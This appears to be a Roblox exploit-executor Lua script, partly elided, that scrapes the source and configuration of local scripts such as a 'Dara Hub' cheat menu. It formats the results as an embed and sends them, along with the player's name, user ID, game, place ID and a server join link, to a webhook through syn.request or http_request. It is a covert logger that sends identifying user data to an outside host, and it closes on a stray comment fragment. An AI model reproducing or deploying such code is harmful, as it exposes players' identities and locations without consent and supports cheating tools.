...
-- Function to extract key-value pairs from string
local function extractConfigData(scriptContent)
    local extractedData = {}
    
    -- Pattern to find key-value pairs (supports various syntaxes)
    local patterns = {
        -- Lua table syntax: ["KEY"] = "VALUE",
        ['%[["\']([^"\']+)["\']%]%s*=%s*["\']([^"\']+)["\']'] = true,
        -- Lua table syntax: KEY = "VALUE",
        ['([%w_]+)%s*=%s*["\']([^"\']+)["\']'] = true,
        -- JSON-like syntax: "KEY": "VALUE"
        ['["\']([^"\']+)["\']%s*:%s*["\']([^"\']+)["\']'] = true
    }
    
    -- Look for specific patterns
    for pattern in pairs(patterns) do
        for key, value in scriptContent:gmatch(pattern) do
            if #key > 2 and #value > 2 then  -- Filter out short matches
                extractedData[key] = value
            end
        end
    end
    
    -- Look for translation tables specifically
    local translationStart = scriptContent:find('Translations%s*=%s*{')
    if translationStart then
        local translationContent = scriptContent:sub(translationStart)
        local langStart = translationContent:find('%["en"%]%s*=%s*{')
        if langStart then
            local langContent = translationContent:sub(langStart)
            for key, value in langContent:gmatch('%[["\']([^"\']+)["\']%]%s*=%s*["\']([^"\']+)["\']') do
                extractedData["TRANS_"..key] = value
            end
        end
    end
    
    -- Look for WindUI configuration
    if scriptContent:find("WindUI") then
        extractedData["GUI_FRAMEWORK"] = "WindUI"
        
        -- Extract WindUI properties
        local windowTitle = scriptContent:match('Title%s*=%s*["\']([^"\']+)["\']')
        if windowTitle then
            extractedData["WINDOW_TITLE"] = windowTitle
        end
        
        local author = scriptContent:match('Author%s*=%s*["\']([^"\']+)["\']')
        if author then
...
-- Function to get script content (you need to specify which script)
local function getTargetScript()
    -- Method 1: If you know the script path
    local scriptPath = game:GetService("Players").LocalPlayer.PlayerScripts
    -- Or search for specific script names
    local scriptsToCheck = {
        ...
        "UI",
        "GUI",
        "DaraHub",  -- From your example
        "WindUI"    -- From your example
    }
    
    for _, scriptName in pairs(scriptsToCheck) do
        local found = scriptPath:FindFirstChild(scriptName, true)
        if found and found:IsA("LuaSourceContainer") then
            return found.Source
        end
    end
    
    -- Method 2: Get from clipboard or pre-defined
    return nil  -- Return nil if no script found
end

-- Main execution
local scriptContent = getTargetScript()
local extractedData = {}

if scriptContent then
    extractedData = extractConfigData(scriptContent)
else
    -- If can't get script content, create test data based on your example
    extractedData = {
        ["GUI_FRAMEWORK"] = "WindUI",
        ["WINDOW_TITLE"] = "loc:SCRIPT_TITLE",
        ["AUTHOR"] = "loc:WELCOME",
        ["FOLDER"] = "DaraHub",
        ["TRANS_WELCOME"] = "Made by: Pnsdg And Yomka",
        ["TRANS_SCRIPT_TITLE"] = "Dara Hub",
        ["TRANS_FEATURES"] = "Features",
        ["DETECTED_FEATURES"] = "Infinite Jump, Fly, ESP, Auto Features"
    }
end

-- Format extracted data for Discord
local function createDataEmbed(data)
    local fields = {}
    local importantKeys = {}
    ...
    for key, value in pairs(data) do
        if key:find("^TRANS_") then
            table.insert(translationKeys, {key = key:gsub("^TRANS_", ""), value = value})
        elseif key == "AUTHOR" or key == "WINDOW_TITLE" or key == "GUI_FRAMEWORK" then
            table.insert(importantKeys, {key = key, value = value})
        else
            table.insert(configKeys, {key = key, value = value})
        end
    end
    
    -- Add important keys first
    if #importantKeys > 0 then
        local fieldValue = ""
        for _, item in ipairs(importantKeys) do
            fieldValue = fieldValue .. string.format("**%s:** %s\n", item.key, item.value)
        end
        table.insert(fields, {
    ...
    -- Add translations
    if #translationKeys > 0 then
        local translationsValue = ""
        for i, item in ipairs(translationKeys) do
            if i <= 10 then  -- Limit to first 10
                translationsValue = translationsValue .. string.format("`%s`: %s\n", item.key, item.value)
            end
        end
        if #translationKeys > 10 then
            translationsValue = translationsValue .. string.format("+ %d more translations...", #translationKeys - 10)
        end
        
        table.insert(fields, {
            name = string.format("🌐 Translations (%d)", #translationKeys),
    ...
    if #configKeys > 0 then
        local configValue = ""
        for i, item in ipairs(configKeys) do
            configValue = configValue .. string.format("`%s` = `%s`\n", item.key, item.value)
        end
...
local embedFields = createDataEmbed(extractedData)

-- Add script detection info field
table.insert(embedFields, 1, {
    name = "🔍 Script Analysis",
    value = string.format("**Player:** [%s](https://www.roblox.com/users/%d/profile)\n**Game:** %s\n**Place ID:** `%d`\n**Detected:** %s", 
        localPlayer.Name, localPlayer.UserId, placeName, placeId, 
        extractedData["GUI_FRAMEWORK"] or "Custom Script"),
    inline = false
})

local Embed = {
    title = "📜 Script Configuration Detected",
    description = string.format("**%s** loaded a script with %d configuration values", 
        localPlayer.Name, #extractedData),
    color = 3066993,  -- Green
    fields = embedFields,
    timestamp = string.format("%d-%d-%dT%02d:%02d:%02dZ", Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
    footer = {
        text = string.format("Auto-Detection | %s", os.date("%X")),
...
local webhookSuccess, webhookResponse = pcall(function()
    return (syn and syn.request or http_request) {
        ...
        Body = HttpService:JSONEncode({
            embeds = { Embed },
            content = string.format("🚨 **Script Loaded!**\n👤 **Player:** %s\n🎮 **Game:** %s\n🔗 **Join:** https://www.roblox.com/games/start?placeId=%d&jobId=%s",
                localPlayer.Name, placeName, placeId, jobId)
        })
    }
end)
...
if not webhookSuccess then
    ...
    print(string.format("Sent configuration data for %s", localPlayer.Name))
    print(string.format("Detected %d configuration values", #extractedData))
end
	--BUTTONS KEYBIND
